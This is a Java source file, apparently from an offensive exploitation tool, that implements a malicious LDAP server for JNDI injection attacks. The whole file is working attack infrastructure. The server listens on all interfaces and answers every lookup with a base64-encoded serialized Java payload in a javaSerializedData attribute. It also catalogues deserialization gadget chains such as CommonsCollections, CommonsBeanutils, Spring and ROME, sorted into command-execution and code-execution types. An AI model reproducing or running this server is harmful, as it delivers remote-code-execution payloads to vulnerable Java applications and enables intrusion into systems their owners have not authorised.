package io.github.exp1orer.server;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.listener.interceptor.InterceptedSearchOperation;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import com.unboundid.util.Base64;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.UnknownHostException;
import java.text.ParseException;
import java.util.HashMap;
import java.util.Map;

public class LDAPServer implements Runnable {
    private static final String LDAP_BASE = "dc=example,dc=com";
    private String gadget = "CommonsBeanutils1";
    private Integer port;
    private String ip;

    public boolean gadgetFlag;
    public boolean echoFlag;
    public static String serializedData;
    public static boolean enableLDAPLog;
    public static Map<String, String> gadgetType = new HashMap<String, String>();
    public final String[] gadgets = new String[]{
            "BeanShell1",
            "CommonsBeanutils1",
            "CommonsBeanutils2",
            "CommonsCollections1",
            "CommonsCollections2",
            "CommonsCollections3",
            "CommonsCollections4",
            "CommonsCollections5",
            "CommonsCollections6",
            "CommonsCollections7",
            "CommonsCollections8",
            "CommonsCollections9",
            "CommonsCollections10",
            "CommonsCollectionsK1",
            "CommonsCollectionsK2",
            "CommonsCollectionsK3",
            "CommonsCollectionsK4",
            "Groovy1",
            "Weblogic2555",
            "Jdk7u21",
            "ROME",
            "Spring1",
            "Spring2"
    };

    public LDAPServer(String ip, int port) {
        this.ip = ip;
        this.port = port;
    }

    public LDAPServer(String ip, int port, String gadget) {
        this.ip = ip;
        this.port = port;
        this.gadget = gadget;
    }

    @Override
    public void run() {
        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig("listen",
                    InetAddress.getByName("0.0.0.0"), port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(String.format("http://%s:%d/#Object", ip, port))));
            InMemoryDirectoryServer server = new InMemoryDirectoryServer(config);
            System.out.println("[+] LDAP Listening on: " + ip + ":" + String.valueOf(port));
            server.startListening();
        } catch (LDAPException e) {
            System.out.println("LDAP Server???????????????????????????: " + e.toString());
        } catch (UnknownHostException unknownHostException) {
            unknownHostException.printStackTrace();
        } catch (MalformedURLException urlException) {
            urlException.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        private URL codebase;

        public OperationInterceptor(URL codebase) {
            this.codebase = codebase;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            if (result.getConnectedAddress() != null && enableLDAPLog) {
                System.out.println("[*] LDAP request from address: " + ((InterceptedSearchOperation) result).getClientConnection().getSocket().getInetAddress().getHostAddress());
            }
            if (base.trim().length() >= 1) {
                Entry entry = new Entry(base);
                try {
                    sendResult(result, base, entry);
                } catch (LDAPException e) {
                    e.printStackTrace();
                }
            }
        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException {
            e.addAttribute("javaClassName", "foo");
            try {
                e.addAttribute("javaSerializedData", Base64.decode(LDAPServer.serializedData));
            } catch (ParseException parseException) {
                parseException.printStackTrace();
            }
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }

    static {
        gadgetType.put("commandExecute", "BeanShell1,CommonsBeanutils2,CommonsCollections1,CommonsCollections5,CommonsCollections6,CommonsCollections7,CommonsCollections9,CommonsCollectionsK3,CommonsCollectionsK4,Groovy1,Weblogic2555");
        gadgetType.put("codeExecute", "CommonsBeanutils1,CommonsCollections2,CommonsCollections3,CommonsCollections4,CommonsCollections8,CommonsCollections10,CommonsCollectionsK1,CommonsCollectionsK2,Jdk7u21,ROME,Spring1,Spring2");
    }
}
